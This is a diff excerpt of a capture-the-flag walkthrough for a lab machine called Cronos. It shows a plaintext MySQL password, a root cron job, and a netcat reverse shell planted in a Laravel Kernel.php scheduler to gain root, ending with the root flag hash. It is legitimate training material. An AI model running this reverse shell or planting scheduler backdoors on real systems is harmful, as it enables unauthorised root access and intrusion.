@@ -71,3 +71,26 @@ www-data@cronos:/var/www/admin$ mysql -u admin -p
 mysql -u admin -p 
 Enter password: kEjdbRigfBHUREiNSDs
 Login into mysql database I get a hash for the admin but that does not seem to lead anywhere. So i decide to run a script to check privileges.
+Of interest are the cron jobs
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+On the Kernel php file, I add the below snippet;
+www-data@cronos:/var/www/laravel/app/Console$ ls
+ls
+Kernel.php
+
+protected function schedule(Schedule $schedule)
+    {
+         $schedule->exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4445 >/tmp/f &')
+                  ->everyMinute()
+                  ->runInBackground();
+    }
+
+And then set up a netcat reverse listener and eventually get root on the box.
+# whoami
+root
+# cat /root/root.txt
+1703b8a3c9a8dde879942c79d02fd3a0
